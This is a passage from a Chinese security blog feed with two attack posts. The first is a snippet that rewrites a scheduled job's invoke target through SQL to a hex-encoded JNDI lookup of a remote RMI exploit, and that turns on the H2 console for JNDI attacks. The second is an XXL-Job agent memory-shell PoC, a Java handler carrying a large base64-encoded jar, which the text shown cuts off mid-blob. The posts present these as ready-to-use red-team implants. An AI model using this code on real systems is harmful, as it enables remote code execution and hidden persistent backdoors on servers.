&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://forum.butian.net/share/2796">https://forum.butian.net/share/2796</a></p><p><a href="https://github.com/SpringKill-team/SecurityInspector">https://github.com/SpringKill-team/SecurityInspector</a></p><h3 id="一些定时任务可利用点"><a href="#一些定时任务可利用点" class="headerlink" title="一些定时任务可利用点"></a>一些定时任务可利用点</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>String[] beanNames = beanFactory.getBeanDefinitionNames();<br><span class="hljs-keyword">for</span>(String beanName : beanNames)&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> beanFactory.getBean(beanName).getClass().getName();<br>    map.put(beanName, name1);<br>&#125;<br><span class="hljs-keyword">return</span> map;<br><br><br><br><br><span class="hljs-comment">//调bean去执行sql</span><br>jdbcTemplate.execute(<span class="hljs-string">&#x27;UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e6c6461702e496e697469616c4c646170436f6e746578742e6c6f6f6b75702827726d693a2f2f3132372e302e302e313a313039372f6578702729 WHERE job_id = 4&#x27;</span>);<br><br><br><span class="hljs-comment">//h2 2.0.206  修复控制台jndi连接,仅仅允许java:开头</span><br><span class="hljs-comment">// &quot;spring.h2.console-org.springframework.boot.autoconfigure.h2.H2ConsoleProperties&quot; -&gt; &quot;org.springframework.boot.autoconfigure.h2.H2ConsoleProperties&quot;   开启控制台</span><br><br>spring.h2.console-org.springframework.boot.autoconfigure.h2.H2ConsoleProperties.setEnabled(<span class="hljs-literal">true</span>);<br>然后访问h2-&gt;jndi工具<br><br></code></pre></td></tr></table></figure><p><img src="image-20241202001742145.png" alt="image-20241202001742145"></p><p><img src="image-20241202001754398.png" alt="image-20241202001754398"></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxljob-agent内存马(&gt;=2.3.0)</title>
    <link href="/2024/10/26/xxljob-agent%E5%86%85%E5%AD%98%E9%A9%AC-2-3-1/"/>
    <url>/2024/10/26/xxljob-agent%E5%86%85%E5%AD%98%E9%A9%AC-2-3-1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几个月攻防时，碰到有执行器，但是执行器不触发，且执行器和注册中心都在一个机器上，所以直接打agent马子就好了。用网上的poc结果不行，所以自己就研究了下，没什么好说的，直接贴代码。执行后会在日记里获取agent注入信息，当然，9999也是可以盲打，直接替换一下就行，就不贴了。可能2.3.0以上的IJobHandler可能有点不一样，大家自己手动改改就行</p><h3 id="0x01-poc"><a href="#0x01-poc" class="headerlink" title="0x01 poc"></a>0x01 poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xxl.job.admin;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><span class="hljs-keyword">import</span> com.xxl.job.core.context.XxlJobHelper;<br><span class="hljs-keyword">import</span> com.xxl.job.core.handler.IJobHandler;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.management.ManagementFactory;<br><span class="hljs-keyword">import</span> java.lang.management.RuntimeMXBean;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WriteGlueJobHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IJobHandler</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">code1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">code2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;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